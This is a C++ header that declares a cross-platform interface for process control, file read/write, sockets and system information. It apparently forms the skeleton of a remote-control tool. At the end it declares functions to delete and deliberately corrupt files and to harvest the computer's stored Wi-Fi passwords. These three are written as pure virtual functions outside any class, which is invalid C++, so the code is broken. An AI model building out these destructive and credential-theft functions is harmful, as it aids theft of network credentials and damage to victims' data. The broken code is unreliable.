#ifndef PLATFORM_H
#define PLATFORM_H

#include <string>
#include <vector>
#include <memory>

// Platform detection
#if defined(_WIN32) || defined(_WIN64)
#define PLATFORM_WINDOWS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <psapi.h>
#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")
#endif
typedef SOCKET SocketHandle;
#elif defined(__linux__)
#define PLATFORM_LINUX
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <sys/types.h>
typedef int SocketHandle;
#elif defined(__APPLE__)
#define PLATFORM_MACOS
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <sys/types.h>
#include <libproc.h>
typedef int SocketHandle;
#endif

namespace Platform
{
    // Process information structure
    struct ProcessInfo
    {
        unsigned long pid;
        std::string name;
        std::string path;
        double cpuUsage;
        unsigned long memoryUsage;

        std::string toString() const;
    };

    // System information
    struct SystemInfo
    {
        std::string osName;
        std::string architecture;
        std::string hostname;
        unsigned long totalMemory;
        unsigned long availableMemory;
        int cpuCores;

        std::string toString() const;
    };

    // Platform-specific implementations
    class IPlatform
    {
    public:
        virtual ~IPlatform() = default;

        // Process management
        virtual std::vector<ProcessInfo> listProcesses() = 0;
        virtual bool startProcess(const std::string &command, unsigned long &outPid) = 0;
        virtual bool killProcess(unsigned long pid) = 0;
        virtual bool processExists(unsigned long pid) = 0;
        virtual ProcessInfo getProcessInfo(unsigned long pid) = 0;

        // System information
        virtual SystemInfo getSystemInfo() = 0;
        virtual std::string getOSName() = 0;

        // File system operations
        virtual std::vector<std::string> listDirectory(const std::string &path) = 0;
        virtual bool fileExists(const std::string &path) = 0;
        virtual std::string readFile(const std::string &path) = 0;
        virtual bool writeFile(const std::string &path, const std::string &content) = 0;

        // Socket operations
        virtual void initSockets() = 0;
        virtual void cleanupSockets() = 0;
        virtual void closeSocket(SocketHandle socket) = 0;
    };

    // Factory function to create platform-specific implementation
    std::unique_ptr<IPlatform> createPlatform();

    // Function to delete/corrupt file
    virtual bool deleteFile(const std::string &path) = 0;
    virtual bool corruptFile(const std::string &path) = 0; // Làm lỗi file
    // Function to get wifi password in computers
    virtual std::string getWifiPasswords() = 0;
}

#endif // PLATFORM_H